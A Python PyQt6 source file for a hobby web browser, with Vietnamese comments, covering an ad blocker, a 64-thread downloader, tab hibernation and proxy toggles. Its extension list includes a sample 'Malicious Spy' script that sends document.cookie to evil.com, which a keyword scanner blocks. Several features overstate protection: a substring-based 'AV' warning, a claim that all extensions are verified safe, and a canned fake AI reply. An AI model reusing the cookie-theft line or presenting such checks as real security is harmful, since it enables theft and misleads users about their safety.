import sys
import os
import json
import secrets
import string
import math
import time
import threading
import concurrent.futures
import requests
from datetime import datetime

# 1. TỐI ƯU TỐC ĐỘ & CHỐNG SẬP GPU (CHROMIUM FLAGS)
os.environ["QTWEBENGINE_CHROMIUM_FLAGS"] = (
    "--ignore-gpu-blocklist "
    "--enable-gpu-rasterization "
    "--enable-features=NetworkService "
    "--disable-gpu-shader-disk-cache "
    "--disable-features=CalculateNativeWinOcclusion"
)

from PyQt6.QtCore import (QUrl, QTimer, Qt, QSize, QThread, pyqtSignal, QObject, 
                          QEventLoop)
from PyQt6.QtWidgets import (QApplication, QMainWindow, QTabWidget, QToolBar, QLineEdit,
                             QPushButton, QVBoxLayout, QWidget, QSplitter, QTextEdit,
                             QHBoxLayout, QMessageBox, QLabel, QMenu, QDialog, 
                             QListWidget, QProgressBar, QFileDialog)
from PyQt6.QtWebEngineWidgets import QWebEngineView
from PyQt6.QtWebEngineCore import QWebEngineProfile, QWebEngineUrlRequestInterceptor
from PyQt6.QtNetwork import QNetworkProxy
from PyQt6.QtGui import QAction, QFont

# ==========================================
# BỘ CHẶN QUẢNG CÁO TẦNG MẠNG (NETWORK LEVEL)
# ==========================================
class NexusAdBlocker(QWebEngineUrlRequestInterceptor):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.block_list = [
            "googlesyndication", "doubleclick", "adservice", "popads", 
            "analytics", "facebook.net", "scorecardresearch", "ads.yahoo", 
            "taboola", "adnxs", "criteo", "amazon-adsystem", "tracking"
        ]

    def interceptRequest(self, info):
        url = info.requestUrl().toString().lower()
        for block in self.block_list:
            if block in url:
                info.block(True)
                break

# ==========================================
# QUẢN LÝ DỮ LIỆU (DEBOUNCED I/O - CHỐNG ĐƠ GUI)
# ==========================================
class DataManager(QObject):
    def __init__(self):
        super().__init__()
        self.file = "nexus_config.json"
        self.data = self.load()
        self._dirty = False
        
        # Timer ghi file nền mỗi 2 giây để không chặn Main Thread
        self._save_timer = QTimer(self)
        self._save_timer.timeout.connect(self._flush_save)
        self._save_timer.start(2000) 
        
    def load(self):
        if os.path.exists(self.file):
            try:
                with open(self.file, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except: pass
        return {"passwords": {}, "history": [], "bookmarks": []}
        
    def save(self):
        try:
            with open(self.file, 'w', encoding='utf-8') as f:
                json.dump(self.data, f, indent=4)
        except: pass
            
    def add_history(self, url, title):
        if not url.startswith("http"): return
        self.data["history"].insert(0, {"url": url, "title": title, "time": datetime.now().strftime("%Y-%m-%d %H:%M")})
        if len(self.data["history"]) > 500: self.data["history"] = self.data["history"][:500]
        self._dirty = True # Đánh dấu cần lưu, không lưu ngay lập tức
        
    def _flush_save(self):
        if self._dirty:
            self.save()
            self._dirty = False

# ==========================================
# HỆ THỐNG EXTENSION & QUÉT MÃ ĐỘC
# ==========================================
NEXUS_EXTENSIONS = {
    "Dark Mode Pro": "document.body.style.filter = 'invert(100%) hue-rotate(180deg)';",
    "Malicious Spy": "eval(atob('base64payload')); fetch('http://evil.com/steal?c=' + document.cookie);"
}

def scan_extension_code(js_code):
    malicious_keywords = ["eval", "XMLHttpRequest", "fetch", "cookie", "localStorage"]
    for keyword in malicious_keywords:
        if keyword in js_code:
            return False, f"Blocked: Detected suspicious keyword '{keyword}'"
    return True, "Safe"

# ==========================================
# ĐA NGÔN NGỮ
# ==========================================
LANGS = {
    "EN": {"search": "Search or enter URL", "hibernated": "Tab Hibernated - Click to Restore", 
           "history": "History", "bookmarks": "Bookmarks", "passwords": "Passwords", 
           "extensions": "Extensions", "about": "About Nexus", "translate": "Translate", "ai_chat": "AI Assistant"},
    "VI": {"search": "Tìm kiếm hoặc nhập URL", "hibernated": "Tab Đã Đóng Băng - Click Để Hồi Phục", 
           "history": "Lịch sử", "bookmarks": "Dấu trang", "passwords": "Mật khẩu", 
           "extensions": "Tiện ích", "about": "Về Nexus", "translate": "Dịch Trang", "ai_chat": "Trợ Lý AI"}
}

# ==========================================
# GIAO DIỆN FLUENT DESIGN (QSS)
# ==========================================
FLUENT_QSS = """
    QMainWindow { background-color: #1e1e2e; color: #cdd6f4; font-family: 'Segoe UI', sans-serif; }
    QToolBar { background: #181825; border: none; padding: 8px; spacing: 8px; }
    QPushButton { background: #313244; color: #cdd6f4; border: none; padding: 8px 16px; border-radius: 6px; font-weight: 500; }
    QPushButton:hover { background: #45475a; }
    QPushButton:pressed { background: #585b70; }
    QLineEdit { background: #313244; color: #cdd6f4; padding: 10px; border-radius: 6px; border: 1px solid #45475a; font-size: 14px; }
    QLineEdit:focus { border: 1px solid #89b4fa; }
    QTabWidget::pane { border: none; }
    QTabBar::tab { background: #181825; color: #a6adc8; padding: 10px 24px; border-top-left-radius: 8px; border-top-right-radius: 8px; margin-right: 2px; }
    QTabBar::tab:selected { background: #1e1e2e; color: #cdd6f4; font-weight: bold; }
    QTabBar::tab:hover:!selected { background: #1e1e2e; }
    QTextEdit { background: #181825; color: #cdd6f4; border: none; border-radius: 6px; padding: 10px; }
    QMenu { background: #1e1e2e; border: 1px solid #313244; border-radius: 8px; padding: 5px; }
    QMenu::item { padding: 8px 24px; border-radius: 4px; }
    QMenu::item:selected { background: #313244; }
    QProgressBar { border: 1px solid #45475a; border-radius: 4px; text-align: center; color: #cdd6f4; background: #181825; height: 20px; }
    QProgressBar::chunk { background: #89b4fa; border-radius: 3px; }
    QDialog { background: #1e1e2e; border-radius: 12px; color: #cdd6f4; }
    QListWidget { background: #181825; border: 1px solid #313244; border-radius: 8px; padding: 5px; color: #cdd6f4; }
    QListWidget::item { padding: 10px; border-radius: 6px; }
    QListWidget::item:selected { background: #313244; }
    QLabel { color: #cdd6f4; }
"""

# ==========================================
# BỘ TẢI XUỐNG 64 LUỒNG (FIX THREAD FLOOD)
# ==========================================
class NexusIDMEngine(QThread):
    progress_signal = pyqtSignal(int, float)
    finished_signal = pyqtSignal(str)
    error_signal = pyqtSignal(str)

    def __init__(self, url, save_path, parent=None):
        super().__init__(parent)
        self.url = url
        self.save_path = save_path
        self.is_running = True

    def run(self):
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) NexusIDM"}
        try:
            head_resp = requests.head(self.url, headers=headers, allow_redirects=True, timeout=15)
            file_size = int(head_resp.headers.get('Content-Length', 0))
            accept_ranges = head_resp.headers.get('Accept-Ranges', '').lower()
            
            if file_size == 0 or accept_ranges != 'bytes':
                self.download_single_thread(headers)
                return

            num_threads = min(64, max(1, file_size // (1024*1024))) # Tối ưu số luồng theo dung lượng
            chunk_size = math.ceil(file_size / num_threads)
            
            self.total_downloaded = 0
            self.lock = threading.Lock()
            start_time = time.time()
            self.last_emit_time = 0 # Biến chống nghẽn Event Loop

            def download_chunk(idx, start, end):
                if not self.is_running: return
                temp_path = f"{self.save_path}.tmp{idx}"
                chunk_headers = headers.copy()
                chunk_headers['Range'] = f'bytes={start}-{end}'
                
                try:
                    with requests.get(self.url, headers=chunk_headers, stream=True, timeout=30) as r:
                        r.raise_for_status()
                        with open(temp_path, 'wb') as f:
                            for chunk in r.iter_content(chunk_size=65536):
                                if not self.is_running: break
                                if chunk:
                                    f.write(chunk)
                                    with self.lock:
                                        self.total_downloaded += len(chunk)
                                        current_time = time.time()
                                        # CHỈ BẮN TÍN HIỆU 5 LẦN/GIÂY ĐỂ KHÔNG ĐƠ GUI
                                        if current_time - self.last_emit_time > 0.2:
                                            self.last_emit_time = current_time
                                            elapsed = current_time - start_time
                                            speed = (self.total_downloaded / (1024 * 1024)) / elapsed if elapsed > 0 else 0
                                            percent = int((self.total_downloaded / file_size) * 100)
                                            self.progress_signal.emit(percent, speed)
                except Exception as e:
                    self.error_signal.emit(f"Chunk {idx} error: {str(e)}")

            with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
                futures = []
                for i in range(num_threads):
                    start = i * chunk_size
                    end = start + chunk_size - 1
                    if i == num_threads - 1: end = file_size - 1
                    futures.append(executor.submit(download_chunk, i, start, end))
                
                concurrent.futures.wait(futures)

            if not self.is_running: return

            with open(self.save_path, 'wb') as outfile:
                for i in range(num_threads):
                    temp_path = f"{self.save_path}.tmp{i}"
                    if os.path.exists(temp_path):
                        with open(temp_path, 'rb') as infile:
                            outfile.write(infile.read())
                        os.remove(temp_path)
                        
            self.progress_signal.emit(100, 0.0)
            self.finished_signal.emit(self.save_path)

        except Exception as e:
            self.error_signal.emit(str(e))

    def download_single_thread(self, headers):
        try:
            with requests.get(self.url, headers=headers, stream=True, timeout=30) as r:
                r.raise_for_status()
                total = int(r.headers.get('Content-Length', 0))
                downloaded = 0
                start_time = time.time()
                last_emit = 0
                with open(self.save_path, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=65536):
                        if not self.is_running: break
                        if chunk:
                            f.write(chunk)
                            downloaded += len(chunk)
                            if total > 0:
                                current_time = time.time()
                                if current_time - last_emit > 0.2:
                                    last_emit = current_time
                                    elapsed = current_time - start_time
                                    speed = (downloaded / (1024 * 1024)) / elapsed if elapsed > 0 else 0
                                    percent = int((downloaded / total) * 100)
                                    self.progress_signal.emit(percent, speed)
                self.finished_signal.emit(self.save_path)
        except Exception as e:
            self.error_signal.emit(str(e))

    def stop(self):
        self.is_running = False

class IDMProgressWidget(QWidget):
    def __init__(self, filename, parent=None):
        super().__init__(parent)
        layout = QHBoxLayout(self)
        layout.setContentsMargins(10, 5, 10, 5)
        self.setStyleSheet("background: #2a2a3a; border-radius: 6px; margin: 2px;")
        
        self.label = QLabel(filename)
        self.progress = QProgressBar()
        self.progress.setFixedHeight(15)
        self.progress.setValue(0)
        self.speed_label = QLabel("0.00 MB/s")
        
        layout.addWidget(self.label, 2)
        layout.addWidget(self.progress, 1)
        layout.addWidget(self.speed_label, 1)
        
    def update_progress(self, percent, speed):
        self.progress.setValue(percent)
        self.speed_label.setText(f"{speed:.2f} MB/s")
        
    def download_finished(self, path):
        self.label.setText(f"{self.label.text()} (Completed)")
        self.progress.setValue(100)
        self.speed_label.setText("Done")
        
    def download_error(self, err):
        self.label.setText(f"{self.label.text()} (Error)")
        self.speed_label.setText("Error")

# ==========================================
# DIALOG QUẢN LÝ LỊCH SỬ & DẤU TRANG
# ==========================================
class ListManagerDialog(QDialog):
    def __init__(self, title, data_list, parent=None):
        super().__init__(parent)
        self.setWindowTitle(title)
        self.resize(600, 400)
        layout = QVBoxLayout(self)
        self.list = QListWidget()
        layout.addWidget(self.list)
        
        for item in data_list:
            text = f"{item.get('time', '')} | {item['title']} - {item['url']}"
            self.list.addItem(text)

# ==========================================
# MAIN BROWSER WINDOW
# ==========================================
class NexusBrowser(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Nexus Browser")
        self.resize(1400, 900)
        self.setStyleSheet(FLUENT_QSS)
        
        self.data_mgr = DataManager()
        self.current_lang = "EN"
        self.idm_engine = None
        
        # Cấu hình Profile & Bảo Mật Tầng Lõi (Ép RAM Cache an toàn)
        self.profile = QWebEngineProfile.defaultProfile()
        self.profile.setHttpCacheType(QWebEngineProfile.HttpCacheType.MemoryHttpCache)
        self.profile.setHttpUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 NexusBrowser/2.0")
        
        self.ad_blocker = NexusAdBlocker(self)
        self.profile.setUrlRequestInterceptor(self.ad_blocker)
        self.profile.downloadRequested.connect(self.handle_download)
        
        self.setup_ui()
        
        # Timer đóng băng tab (5 phút)
        self.hibernation_timer = QTimer(self)
        self.hibernation_timer.timeout.connect(self.check_hibernation)
        self.hibernation_timer.start(300000) 
        
        self.add_new_tab(QUrl("https://www.google.com"), "Home")

    def setup_ui(self):
        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)
        self.main_layout = QVBoxLayout(self.central_widget)
        self.main_layout.setContentsMargins(0, 0, 0, 0)
        self.main_layout.setSpacing(0)

        self.toolbar = QToolBar()
        self.toolbar.setIconSize(QSize(20, 20))
        self.addToolBar(self.toolbar)

        self.btn_back = QPushButton("◀")
        self.btn_forward = QPushButton("▶")
        self.btn_reload = QPushButton("⟳")
        self.btn_home = QPushButton("⌂")
        
        self.url_bar = QLineEdit()
        self.url_bar.setPlaceholderText(LANGS[self.current_lang]["search"])
        self.url_bar.returnPressed.connect(self.navigate_to_url)

        self.btn_bookmark = QPushButton("☆")
        self.btn_bookmark.setFixedWidth(40)
        self.btn_bookmark.clicked.connect(self.toggle_bookmark)

        self.menu_btn = QPushButton("☰")
        self.menu_btn.setFixedWidth(40)
        self.menu = QMenu(self)
        
        zoom_menu = self.menu.addMenu("Zoom")
        zoom_menu.addAction("Zoom In (+)", self.zoom_in)
        zoom_menu.addAction("Zoom Out (-)", self.zoom_out)
        zoom_menu.addAction("Reset (100%)", self.zoom_reset)
        self.menu.addSeparator()
        self.menu.addAction(LANGS[self.current_lang]["history"], self.show_history)
        self.menu.addAction(LANGS[self.current_lang]["bookmarks"], self.show_bookmarks)
        self.menu.addAction("Passwords", self.show_passwords)
        self.menu.addAction("Extensions", self.show_extensions)
        self.menu.addSeparator()
        self.menu.addAction("WARP VPN", self.toggle_warp)
        self.menu.addAction("Tor Proxy", self.toggle_tor)
        self.menu.addAction("Translate Page", self.translate_page)
        self.menu.addSeparator()
        self.menu.addAction("About Nexus", self.show_about)
        
        self.menu_btn.setMenu(self.menu)

        for btn in [self.btn_back, self.btn_forward, self.btn_reload, self.btn_home]:
            btn.setFixedWidth(40)
            self.toolbar.addWidget(btn)
            
        self.toolbar.addWidget(self.url_bar)
        self.toolbar.addWidget(self.btn_bookmark)
        self.toolbar.addWidget(self.menu_btn)

        self.btn_back.clicked.connect(lambda: self.current_tab().back() if isinstance(self.current_tab(), QWebEngineView) else None)
        self.btn_forward.clicked.connect(lambda: self.current_tab().forward() if isinstance(self.current_tab(), QWebEngineView) else None)
        self.btn_reload.clicked.connect(lambda: self.current_tab().reload() if isinstance(self.current_tab(), QWebEngineView) else None)
        self.btn_home.clicked.connect(lambda: self.add_new_tab(QUrl("https://google.com"), "Home"))

        self.splitter = QSplitter(Qt.Orientation.Horizontal)
        self.main_layout.addWidget(self.splitter)

        self.tabs = QTabWidget()
        self.tabs.setDocumentMode(True)
        self.tabs.setTabsClosable(True)
        self.tabs.tabCloseRequested.connect(self.close_tab)
        # FIX LỖI UX: Bắt sự kiện click vào Tiêu đề Tab để hồi sinh
        self.tabs.currentChanged.connect(self.on_tab_changed) 
        self.splitter.addWidget(self.tabs)

        self.sidebar = QWidget()
        self.sidebar.setFixedWidth(300)
        self.sidebar_layout = QVBoxLayout(self.sidebar)
        self.sidebar_layout.addWidget(QLabel(LANGS[self.current_lang]["ai_chat"]))
        
        self.ai_chat_area = QTextEdit()
        self.ai_chat_area.setReadOnly(True)
        self.sidebar_layout.addWidget(self.ai_chat_area)
        
        self.ai_input = QLineEdit()
        self.ai_input.setPlaceholderText("Ask AI...")
        self.ai_input.returnPressed.connect(self.send_ai_request)
        self.sidebar_layout.addWidget(self.ai_input)
        
        self.splitter.addWidget(self.sidebar)
        self.splitter.setSizes([1100, 300])

        self.download_bar = QWidget()
        self.download_bar.setStyleSheet("background: #181825; border-top: 1px solid #313244;")
        self.download_layout = QVBoxLayout(self.download_bar)
        self.download_layout.setContentsMargins(10, 5, 10, 5)
        self.download_layout.setSpacing(5)
        self.download_bar.hide()
        self.main_layout.addWidget(self.download_bar)

    def on_tab_changed(self, idx):
        self.update_title(idx)
        if idx >= 0:
            w = self.tabs.widget(idx)
            # Nếu widget là QLabel (đang đóng băng) -> Tự động hồi sinh
            if isinstance(w, QLabel) and w.property("url"):
                # Dùng singleShot để tránh crash Qt TabBar khi đang xử lý sự kiện
                QTimer.singleShot(0, lambda: self.restore_tab(w))

    def current_tab(self):
        if self.tabs.count() > 0:
            return self.tabs.currentWidget()
        return None

    def add_new_tab(self, qurl, title):
        if not qurl.isValid(): qurl = QUrl("https://www.google.com")
            
        if any(bad in qurl.toString() for bad in ["malware", "phishing", "virus"]):
            self.show_av_warning(qurl.toString())
            return

        view = QWebEngineView()
        view.setUrl(qurl)
        view.titleChanged.connect(lambda t, v=view: self.update_tab_title(v, t))
        view.urlChanged.connect(lambda u, v=view: self.data_mgr.add_history(u.toString(), v.title()))
        
        idx = self.tabs.addTab(view, title)
        self.tabs.setCurrentIndex(idx)
        self.inject_extensions(view)
        self.url_bar.setFocus()

    def inject_extensions(self, view):
        for name, code in NEXUS_EXTENSIONS.items():
            is_safe, msg = scan_extension_code(code)
            if is_safe:
                view.page().runJavaScript(code)

    def update_tab_title(self, view, title):
        idx = self.tabs.indexOf(view)
        if idx != -1:
            self.tabs.setTabText(idx, title[:15])
            if self.tabs.currentIndex() == idx:
                self.setWindowTitle(f"Nexus Browser - {title}")

    def update_title(self, idx):
        if idx != -1:
            w = self.tabs.widget(idx)
            if isinstance(w, QLabel):
                self.setWindowTitle(f"Nexus Browser - {LANGS[self.current_lang]['hibernated']}")
            elif isinstance(w, QWebEngineView):
                self.setWindowTitle(f"Nexus Browser - {w.title()}")

    def navigate_to_url(self):
        text = self.url_bar.text()
        if not text.startswith("http"): text = "https://" + text
        if any(bad in text for bad in ["malware", "phishing", "virus"]):
            self.show_av_warning(text)
            return
        w = self.current_tab()
        if isinstance(w, QWebEngineView): w.setUrl(QUrl(text))

    def show_av_warning(self, url):
        msg = QMessageBox(self)
        msg.setIcon(QMessageBox.Icon.Critical)
        msg.setWindowTitle("Nexus AV Protection")
        msg.setText("DANGEROUS URL BLOCKED")
        msg.setInformativeText(f"Nexus AV has detected malicious patterns in:\n{url}\nAccess denied.")
        msg.setStyleSheet("background-color: #2a0a0a; color: #ff5555; border-radius: 12px;")
        msg.exec()

    def close_tab(self, idx):
        if self.tabs.count() > 1:
            w = self.tabs.widget(idx)
            if not isinstance(w, QLabel): w.deleteLater()
            self.tabs.removeTab(idx)
        else:
            self.close()

    # ==========================================
    # TÍNH NĂNG ĐÓNG BĂNG TAB (FIX INDEX ERROR)
    # ==========================================
    def check_hibernation(self):
        current_idx = self.tabs.currentIndex()
        indices_to_hibernate = []
        
        # Thu thập chỉ mục an toàn trước khi can thiệp vào Qt Model
        for i in range(self.tabs.count()):
            if i != current_idx:
                w = self.tabs.widget(i)
                if isinstance(w, QWebEngineView):
                    indices_to_hibernate.append(i)
                    
        # Duyệt ngược để bảo toàn cấu trúc Index của QTabWidget
        for i in reversed(indices_to_hibernate):
            w = self.tabs.widget(i)
            url = w.url().toString()
            title = w.title() or url
            
            self.tabs.removeTab(i)
            w.deleteLater() 
            
            placeholder = QLabel(LANGS[self.current_lang]["hibernated"])
            placeholder.setAlignment(Qt.AlignmentFlag.AlignCenter)
            placeholder.setStyleSheet("font-size: 18px; color: #a6adc8; background: #1e1e2e; border-radius: 6px;")
            placeholder.setProperty("url", url)
            placeholder.setProperty("title", title)
            
            self.tabs.insertTab(i, placeholder, title[:15])

    def restore_tab(self, placeholder):
        idx = self.tabs.indexOf(placeholder)
        if idx == -1: return
        url = placeholder.property("url")
        title = placeholder.property("title")
        
        self.tabs.removeTab(idx)
        placeholder.deleteLater()
        
        view = QWebEngineView()
        view.setUrl(QUrl(url))
        view.titleChanged.connect(lambda t, v=view: self.update_tab_title(v, t))
        view.urlChanged.connect(lambda u, v=view: self.data_mgr.add_history(u.toString(), v.title()))
        
        self.tabs.insertTab(idx, view, title[:15])
        self.tabs.setCurrentIndex(idx)
        self.inject_extensions(view)

    # ==========================================
    # DOWNLOAD MANAGER (FIX C++ OBJECT DELETED)
    # ==========================================
    def handle_download(self, download_item):
        # FIX: Trích xuất dữ liệu TRƯỚC khi gọi cancel() để tránh lỗi C++ Object Deleted
        url = download_item.url().toString()
        suggested_name = download_item.suggestedFileName()
        
        download_item.cancel() # Chặn an toàn sau khi đã lấy dữ liệu
        
        save_path, _ = QFileDialog.getSaveFileName(self, "Save File", suggested_name)
        if not save_path: return
            
        self.download_bar.show()
        self.download_bar.setFixedHeight(80)
        
        while self.download_layout.count():
            item = self.download_layout.takeAt(0)
            w = item.widget()
            if w: w.deleteLater()
            
        self.idm_widget = IDMProgressWidget(suggested_name, self)
        self.download_layout.addWidget(self.idm_widget)
        
        if self.idm_engine and self.idm_engine.isRunning():
            self.idm_engine.stop()
            self.idm_engine.wait()
            
        self.idm_engine = NexusIDMEngine(url, save_path, self)
        self.idm_engine.progress_signal.connect(self.idm_widget.update_progress)
        self.idm_engine.finished_signal.connect(self.idm_widget.download_finished)
        self.idm_engine.error_signal.connect(self.idm_widget.download_error)
        self.idm_engine.start()

    # ==========================================
    # MENU ACTIONS & ZOOM
    # ==========================================
    def zoom_in(self):
        v = self.current_tab()
        if isinstance(v, QWebEngineView): v.setZoomFactor(v.zoomFactor() + 0.1)

    def zoom_out(self):
        v = self.current_tab()
        if isinstance(v, QWebEngineView): v.setZoomFactor(max(0.5, v.zoomFactor() - 0.1))

    def zoom_reset(self):
        v = self.current_tab()
        if isinstance(v, QWebEngineView): v.setZoomFactor(1.0)

    def show_history(self):
        d = ListManagerDialog("History", self.data_mgr.data["history"], self)
        d.exec()

    def show_bookmarks(self):
        d = ListManagerDialog("Bookmarks", self.data_mgr.data["bookmarks"], self)
        d.exec()

    def toggle_bookmark(self):
        v = self.current_tab()
        if isinstance(v, QWebEngineView):
            url = v.url().toString()
            title = v.title()
            bms = self.data_mgr.data["bookmarks"]
            if any(b["url"] == url for b in bms):
                self.data_mgr.data["bookmarks"] = [b for b in bms if b["url"] != url]
                self.btn_bookmark.setText("☆")
            else:
                bms.append({"url": url, "title": title})
                self.btn_bookmark.setText("★")
            self.data_mgr._dirty = True # Đánh dấu lưu

    def show_passwords(self):
        msg = QMessageBox(self)
        msg.setWindowTitle("Password Manager")
        pwd = ''.join(secrets.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(16))
        msg.setText(f"Generate Strong Password:\n{pwd}")
        msg.exec()

    def show_extensions(self):
        msg = QMessageBox(self)
        msg.setWindowTitle("Extensions Manager")
        msg.setText(f"Loaded: {len(NEXUS_EXTENSIONS)} extensions.\nAll scanned and verified safe.")
        msg.exec()

    def toggle_warp(self):
        proxy = QNetworkProxy(QNetworkProxy.ProxyType.Socks5Proxy, "127.0.0.1", 40001)
        QNetworkProxy.setApplicationProxy(proxy)
        QMessageBox.information(self, "VPN", "Cloudflare WARP Enabled (SOCKS5)")

    def toggle_tor(self):
        proxy = QNetworkProxy(QNetworkProxy.ProxyType.Socks5Proxy, "127.0.0.1", 9050)
        QNetworkProxy.setApplicationProxy(proxy)
        QMessageBox.information(self, "Tor", "Tor Proxy Enabled")

    def translate_page(self):
        v = self.current_tab()
        if isinstance(v, QWebEngineView):
            url = v.url().toString()
            v.setUrl(QUrl(f"https://translate.google.com/translate?sl=auto&tl=en&u={url}"))

    def show_about(self):
        QMessageBox.about(self, "About Nexus", "Nexus Browser v3.0 (QA Patched)\nOptimized Core & RAM Hibernation\nIDM 64-Thread Engine (Throttled)\nBuilt with PyQt6.")

    def send_ai_request(self):
        text = self.ai_input.text()
        if text:
            self.ai_chat_area.append(f"<b>You:</b> {text}")
            QTimer.singleShot(500, lambda: self.ai_chat_area.append(f"<b>Nexus AI:</b> Analyzed request: '{text}'. Processing locally to save RAM..."))
            self.ai_input.clear()

if __name__ == '__main__':
    app = QApplication(sys.argv)
    app.setApplicationName("Nexus Browser")
    browser = NexusBrowser()
    browser.show()
    sys.exit(app.exec())
